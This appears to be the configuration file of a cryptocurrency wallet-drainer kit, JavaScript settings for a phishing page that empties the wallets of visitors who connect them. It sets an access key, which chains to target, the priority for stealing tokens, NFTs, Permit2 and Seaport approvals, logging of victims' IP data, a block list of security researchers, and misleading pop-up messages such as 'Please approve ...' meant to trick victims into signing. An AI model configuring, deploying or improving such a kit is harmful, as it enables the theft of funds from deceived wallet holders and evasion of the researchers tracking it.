// Your acces key
let ACCESS_KEY = "4ccf20e0-c351-4e75-84d5-5b51a0c3245a";

let USE_W3M_V3 = true; // Use web3modal v3 instead of v2

// Connect modal settings
let mainModal = "w3m"; // What modal will user see
// w3m - Web3Modal
// sm - sugar modal
// custom - Custom modal code
let customModalCode = ``;
// if you using custom modal code make sure that your modal have these elements with ids:
// web3-modal-trust - Button for TrustWallet connection
// web3-modal-coinbase - Button for CoinBase connection
// web3-modal-metamask - Button for Metamask connection
// web3-modal-web3modal - Button for web3modal connection (other wallets)
// web3-modal - Element of modal
// web3-overlay - (Optional) Element for modal background


// Web3Modal visual settings
let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
let themeVariables = {
    '--w3m-z-index': 10000,
    '--w3m-overlay-backdrop-filter': 'blur(6px)',
};
// Custom styles and colors https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming

// Web3Modal metadata
let w3m_name = ""; // Current window title used if blank
let w3m_description = ""; // Current window title used if blank
let w3m_url = ""; // Current domain used if blank
let w3m_icons = ['https://avatars.githubusercontent.com/u/37784886']; // Your favicon link can be here (using full url recommended)

// Logging setting
let logDrainingStrategy = true; // Log draining strategy
let logEmptyWallets = true; // Log when wallet is empty
let logIpData =  true; // Add IP data to logs

// Repeat the highest proice token if user declines 
let repeatHighest = true;

let retry_changenetwork = 2;

// Weights of transfer, assets with highest weight will be transfered first. Weight = multiplier * eth_price
let multipliers = {
    "LP_NFTS": 1,
    "PERMIT2": 1,
    "BLUR": 1,
    "SEAPORT": 1,
    "SWAP": 1,
    "TOKENS": 1,
    "NFT": 1,
    "NATIVES": 1,
}

// Manual disable/enable chains. true - enabled, false - disabled
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;

let autoconnect = false; // Automatically connect wallet after page was loaded

// Alerts
let useSweetAlert = true; // Set true to use sweet alert, false for default browser alerts
let notEligible = "Your wallet is not eligible, connect another wallet."; // Low balance message
let swal_notEligibleTitle = "Not eligible"; // Title for SweetAlert

let addressChanged = "Your wallet address has changed, connect wallet again please"; // Message text in case of wallet address change in the process of draining
let swal_addressChangedTitle = "Address changed"; // Title for SweetAlert

// Popup settings
let popupEnabled = true; // true or false, popup after connecting wallet while draining
let useDefaultPopup = false;
//HTML Code of popup
// let popupCode = ``;

let popupElementID = "popup";
let canClosePopup = true; // Can user close popup?
let popupCloseButtonID = "popupClose";

// Button settings
let connectElement = "connectButton"; // Dont't touch if not sure (class of button that's starts draining)
let messageElement = "messageButton"; // Dont't touch if not sure (id of element that's show status)

let buttonMessagesEnabled = false;
let textInitialConnected = "Try again";
let textProgress = "Loading ...";
let success = "Please approve ...";
let failed = "Try again !";


// Two step draining
// After wallet connection drain doesn't starts, user need to click on additional button.
let twoStep = false; // true to enable twostep
let twoStepButtonElement = "startButton";

// After user connect wallet this function will be called, you can use it to display user info or enable twostep and show form for connecting and for claiming only 
function updateWalletData(walletAddress, walletEthBalance, status){
    // Paste any code that you want here
    // This function will execute after wallet connection
    // Use walletAddress and walletEthBalance variables

    // Status:
    // 0 - Connected wallet
    // 1 - Draining started
    // 2 - User not eligible
    // 3 - Draining finished

    console.log(walletAddress, walletEthBalance, status);
}

// let wc_projectid = "2d973b27c3555825adbb22581e7c322c"; // ProjectID from https://cloud.walletconnect.com/

//Do not touch
let cfgversion = 680;

// Block wallets
let researchers = [
    "0x0000000000000000000000000000000000000003",
];

// [EXPERIMENTAL FUNCTIONS] Enable them if you know what you are doing
// These functions are untested and may cause potential profit loss
let experimental = {
    "disable-w3m-featured":true,
};